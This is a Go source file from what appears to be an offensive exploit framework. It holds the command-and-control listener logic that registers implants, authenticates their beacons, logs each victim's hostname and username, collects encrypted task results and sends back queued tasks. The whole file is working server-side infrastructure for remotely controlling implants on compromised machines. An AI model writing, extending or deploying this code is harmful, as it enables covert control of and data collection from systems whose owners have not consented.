package listeners

import (
	"fmt"
	"log"
	"time"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/server/sessions"
	"google.golang.org/protobuf/proto"
)

// ErrBeaconAuth is returned when HMAC validation fails (callers should drop silently).
var ErrBeaconAuth = fmt.Errorf("beacon auth failed")

// HandleRegister processes an implant registration.
func HandleRegister(h *BeaconHandler, reg *pb.Register, protocol, remoteAddr string) (*pb.RegisterResponse, error) {
	if err := zcrypto.VerifyHMAC(h.Secret, reg.ImplantId, reg.Timestamp, reg.Hmac, 30); err != nil {
		return nil, ErrBeaconAuth
	}
	if h.ReplayCache != nil {
		if err := h.ReplayCache.CheckAndRecord(reg.ImplantId, reg.Timestamp); err != nil {
			return nil, ErrBeaconAuth
		}
	}

	sess := sessions.NewSession(reg, protocol, remoteAddr)

	sessionKey, err := zcrypto.GenerateAESKey()
	if err != nil {
		return nil, fmt.Errorf("generate session key: %w", err)
	}
	sess.SessionKey = sessionKey

	sessionID, err := h.Sessions.Register(sess)
	if err != nil {
		return nil, fmt.Errorf("register session: %w", err)
	}

	log.Printf("[%s] new session: %s (implant=%s, host=%s, user=%s)",
		protocol, sessionID, reg.ImplantId, reg.Hostname, reg.Username)

	if h.OnEvent != nil {
		h.OnEvent(&pb.Event{
			Type:      pb.EventType_EVENT_SESSION_NEW,
			Timestamp: time.Now().Unix(),
			SessionId: sessionID,
			Message:   fmt.Sprintf("New session from %s@%s", reg.Username, reg.Hostname),
		})
	}

	encryptedKey, err := zcrypto.AESEncrypt(h.Secret, sessionKey)
	if err != nil {
		return nil, fmt.Errorf("encrypt session key: %w", err)
	}

	return &pb.RegisterResponse{
		Success:             true,
		SessionId:           sessionID,
		NextCheckinMs:       5000,
		EncryptedSessionKey: encryptedKey,
	}, nil
}

// HandleBeacon processes an implant beacon check-in.
func HandleBeacon(h *BeaconHandler, beacon *pb.Beacon) (*pb.BeaconResponse, error) {
	if err := zcrypto.VerifyHMAC(h.Secret, beacon.ImplantId, beacon.Timestamp, beacon.Hmac, 30); err != nil {
		return nil, ErrBeaconAuth
	}
	if h.ReplayCache != nil {
		if err := h.ReplayCache.CheckAndRecord(beacon.ImplantId, beacon.Timestamp); err != nil {
			return nil, ErrBeaconAuth
		}
	}

	sess, ok := h.Sessions.GetByImplant(beacon.ImplantId)
	if !ok {
		return nil, ErrBeaconAuth
	}

	h.Sessions.UpdateCheckin(sess.SessionID)

	var results []*pb.TaskResult
	if sess.SessionKey != nil {
		if len(beacon.EncryptedResults) > 0 {
			plaintext, err := zcrypto.AESDecrypt(sess.SessionKey, beacon.EncryptedResults)
			if err != nil {
				log.Printf("[beacon] decrypt results error: %v", err)
			} else {
				payload := &pb.BeaconResultsPayload{}
				if err := proto.Unmarshal(plaintext, payload); err != nil {
					log.Printf("[beacon] unmarshal decrypted results error: %v", err)
				} else {
					results = payload.Results
				}
			}
		}
		// Fail-closed: ignore plaintext results when session encryption is active.
	} else {
		results = beacon.Results
	}

	for _, result := range results {
		h.Dispatcher.HandleResult(result)
	}

	pendingTasks := sess.DrainTasks()

	resp := &pb.BeaconResponse{
		NextCheckinMs: 5000,
		Terminate:     !sess.IsAlive(),
	}

	if sess.SessionKey != nil && len(pendingTasks) > 0 {
		payload := &pb.BeaconTasksPayload{Tasks: pendingTasks}
		plaintext, err := proto.Marshal(payload)
		if err != nil {
			log.Printf("[beacon] marshal tasks payload error: %v", err)
			sess.RequeueTasks(pendingTasks)
		} else {
			encrypted, err := zcrypto.AESEncrypt(sess.SessionKey, plaintext)
			if err != nil {
				log.Printf("[beacon] encrypt tasks error: %v", err)
				sess.RequeueTasks(pendingTasks)
			} else {
				resp.EncryptedTasks = encrypted
			}
		}
	} else if sess.SessionKey == nil {
		resp.Tasks = pendingTasks
	}

	return resp, nil
}